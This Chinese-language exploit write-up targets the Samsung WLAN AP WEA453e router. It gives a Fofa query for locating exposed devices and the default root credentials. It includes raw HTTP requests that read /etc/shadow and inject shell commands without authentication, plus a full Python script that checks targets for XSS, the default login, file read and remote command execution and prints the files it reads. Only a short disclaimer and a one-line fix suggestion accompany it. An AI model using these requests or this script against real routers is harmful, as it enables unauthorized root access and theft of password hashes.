## 0x01 漏洞说明

三星路由器WLAN AP WEA453e 存在多个漏洞，其中包括预身份验证根RCE，这意味着攻击者无需登录即可以root特权远程运行代码

## 0x01 影响版本

​version < 5.2.4.T1

## 0x03 漏洞复现

Fofa搜索语法：（注意：互联网的非授权利用属于违法行为）

    
    
    title="Samsung WLAN AP"

![1617362337_6066fda1329cbe385fab3.png!small?1617362338429](https://image.3001.net/images/20210402/1617362337_6066fda1329cbe385fab3.png!small?1617362338429)

主页访问如下：

![1617362377_6066fdc95f13e52af22ae.png!small?1617362378370](https://image.3001.net/images/20210402/1617362377_6066fdc95f13e52af22ae.png!small?1617362378370)

### 反射型XSS

利用很简单很鸡肋

url地址加上XSS代码即可触发

![](https://image.3001.net/images/20210402/1617362431_6066fdff9daac89fdd336.png!small)

### 通用弱口令

默认的用户名密码为：root/sweap12~

![](https://image.3001.net/images/20210402/1617362476_6066fe2c4e61f4ac61a8d.png!small)

### 任意文件读取

数据包为：

    
    
    POST /(download)/etc/shadow HTTP/1.1
    Host: IP
    Connection: close
    Content-Length: 109
    Cache-Control: max-age=0
    sec-ch-ua: "Chromium";v="89", ";Not A Brand";v="99"
    sec-ch-ua-mobile: ?0
    Upgrade-Insecure-Requests: 1
    Origin: https://IP
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://IP/login.ehp
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    ​
    command1=shell%3Arm+-f+%2Ftmp%2F*.tar.lz4&command2=debug+tech-support+local+ap_20dbab72b873_ts_20201228193452

![1617362557_6066fe7d2d669f1c33e8e.png!small?1617362560402](https://image.3001.net/images/20210402/1617362557_6066fe7d2d669f1c33e8e.png!small?1617362560402)

command1 为：删除先前的文件

command2 为：创建新的文件

这里熟悉我的小伙伴就知道我要啰嗦一句：保存shadow文件用kali的john去跑hash密码

实际测试中发现不使用command1和command2命令也可以读取：

![1617362582_6066fe9656a6a50725717.png!small?1617362582712](https://image.3001.net/images/20210402/1617362582_6066fe9656a6a50725717.png!small?1617362582712)

### 远程命令执行

数据包为：

    
    
    POST /(download)/tmp/1.txt HTTP/1.1
    Host: IP
    Connection: close
    sec-ch-ua: "Chromium";v="89", ";Not A Brand";v="99"
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
    Accept: */*
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: no-cors
    Sec-Fetch-Dest: script
    Content-Length: 40
    Referer: https://IP/main.ehp
    Accept-Encoding
    : gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Content-Length: 40
    ​
    command1=shell:ls -la | dd of=/tmp/1.txt

![1617362717_6066ff1d8baad51c1a24b.png!small?1617362718038](https://image.3001.net/images/20210402/1617362717_6066ff1d8baad51c1a24b.png!small?1617362718038)

检测POC：

    
    
    import requests
    import urllib3
    import sys
    
    urllib3.disable_warnings()
    
    
    def title():
        print("""
            [------------------------------------------------------------------------]
            [------------------ 三星路由器 WLAN AP WEA453e 漏洞合集 --------------------]
            [------------------ Use: python3 samsungwlanapscan.py -------------------]
            [------------------         Author: Henry4E36         -------------------]
            [------------------------------------------------------------------------]
        """)
    
        print("\n")
        print("""[-]说明:
                    [1]: XSS检测；
                    [2]: 通用弱口令检测；
                    [3]: 任意文件读取；
                    [4]: 远程命令执行；
                    [5]: 退出。
        
        
        """)
    
    
    
    def switch_options(option):
        options = {
            "1": xssscan,
            "2": login,
            "3": read_files,
            "4": rce,
            "5": sys.exit
        }
        return options.get(option, "[!]  输入有误！")
    
    # 检测XSS漏洞
    def xssscan(url):
        xss_url = url + "/<script>alert(1)</script>"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
        }
        try:
            res = requests.get(url=xss_url,headers=headers,verify=False,timeout=5)
            if '<html><body><h2><font color="red">/tmp/www/<script>alert(1)</script></font> not found !</h2></body></html>' in res.text and res.status_code == 404:
                print(f"\033[31m[!]  目标系统: {url} 存在反射型XSS\033[0m")
            else:
                print(f"[0]  目标系统: {url} 不存在反射型XSS")
        except Exception as e:
            print("[0]  目标系统出现意外错误！\n", e)
    
    # 检测通用弱口令
    def login(url):
        login_url = url + "/main.ehp"
        # 这可以修改下进行弱口令爆破。
        data = "httpd%3BGeneral%3Blang=en&login_id=root&login_pw=sweap12%7E"
        headers = {
                 "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
             }
        try:
            res = requests.post(url=login_url,data=data,headers=headers,verify=False,timeout=5)
            if "User" in res.text and "root" in res.text and res.status_code == 200:
                print(f"\033[31m[!]  目标系统: {url} 存在通用弱口令\033[0m")
                print(f"\033[31m[-]  user:root   password:sweap12~\033[0m")
            else:
                print(f"[0]  目标系统: {url} 不存在通用弱口令")
        except Exception as e:
            print("[0]  目标系统出现意外错误！\n", e)
    
    def read_files(url):
        # passwd 也可以读取
        vul_url = url + "/(download)/etc/shadow"
        headers = {
                     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
                 }
        try:
            res = requests.get(url=vul_url,headers=headers,verify=False,timeout=5)
            if "root" in res.text and res.status_code == 200:
                print(f"\033[31m[!]  目标系统: {url} 存在任意文件读取！")
                print("[-]  正在读取文件中............\033[0m")
                print(f"[0]  文件内容为: \n{res.text}")
            else:
                print(f"[0]  目标系统: {url} 不存在任意文件读取")
        except Exception as e:
            print("[0]  目标系统出现意外错误！\n", e)
    
    def rce(url):
        rce_url = url + "/(download)/tmp/1.txt"
    
        headers = {
                        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
                        "Referer": f"{url}/main.ehp"
                     }
    
        data = 'command1=shell:ls -la | dd of=/tmp/1.txt'
        try:
            res = requests.post(url=rce_url,data=data,headers=headers,verify=False,timeout=5)
            if "root" in res.text and res.status_code == 200:
                print(f"\033[31m[!]  目标系统: {url} 存在远程命令执行！\033[0m")
                print(f"[0]  响应内容为: \n{res.text}")
            else:
                print(f"[0]  目标系统: {url} 不存在任意文件读取")
        except Exception as e:
            print("[0]  目标系统出现意外错误！\n", e)
    
    
    if __name__ =="__main__":
        title()
        url = str(input("[-]  请输入目标系统URL:\n"))
        option = str(input("[-]  请选择需要检测的项:\n"))
        func = switch_options(option)
        try:
            if "exit" in str(func):
                func(0)
            else:
                func(url)
        except Exception as e:
            print("[0]  输入有误！")

运行效果展示：

![1617362795_6066ff6bde7d978bcc4f8.png!small?1617362796275](https://image.3001.net/images/20210402/1617362795_6066ff6bde7d978bcc4f8.png!small?1617362796275)

## 0x04 修复建议

升级到最新版本，修改默认密码。

##  **结束语**

本文章仅用于交流学习，请勿使用该漏洞进行违法活动。

https://github.com/Henry4E36/samsungwlanapscan

 **参考文章：**

> https://www.seebug.org/vuldb/ssvid-99075

